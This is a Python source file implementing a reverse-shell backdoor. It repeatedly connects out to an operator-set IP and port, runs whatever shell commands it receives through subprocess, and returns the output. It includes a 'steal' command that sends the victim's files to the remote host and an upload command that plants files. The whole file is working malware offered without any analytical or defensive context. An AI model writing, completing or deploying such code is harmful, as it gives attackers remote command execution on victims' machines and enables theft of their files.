import os
import socket
import time
import json
import subprocess

IP = None
PORT = None
def connect(s):
    while(True):
        time.sleep(10)
        try:
            s.connect((str(IP), int(PORT)))
            shell(s)
        except Exception as e:
            print(e)
            connect(s)

def reliable_send(command, target):
    jsondata = json.dumps(command)
    target.send(jsondata.encode())

def reliable_receive(target):
    data = ""
    while(True):
        try:
            data += target.recv(1024).decode().rstrip()
            return json.loads(data)
        except:
            continue

def download(target, file_name):
    f = open(file_name, "wb")
    target.settimeout(1)
    chunk = target.recv(1024)
    while chunk:
        f.write(chunk)
        try:
            chunk = target.recv(1024)
        except socket.timeout:
            break
    target.settimeout(None)
    f.close()

def upload(target, file_name):
    f = open(file_name, "rb")
    target.send(f.read())

def shell(target):
    while(True):
        try:
            command = reliable_receive(target)
            if command == "exit":
                quit()
            elif command[:3] == "cd ":
                os.chdir(command[3:])
            elif command == "clear":
                pass
            elif command[:5] == "steal":
                upload(target, command[6:])
            elif command[:6] == "upload":
                download(target, command[7:])
            else:
                execution = subprocess.Popen(command, shell = True, stdout = subprocess.PIPE, stdin = subprocess.PIPE, stderr = subprocess.PIPE)
                result = execution.stdout.read() + execution.stderr.read()
                result = result.decode()
                reliable_send(result, target)
        except Exception as e:
            print(e)


s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect(s)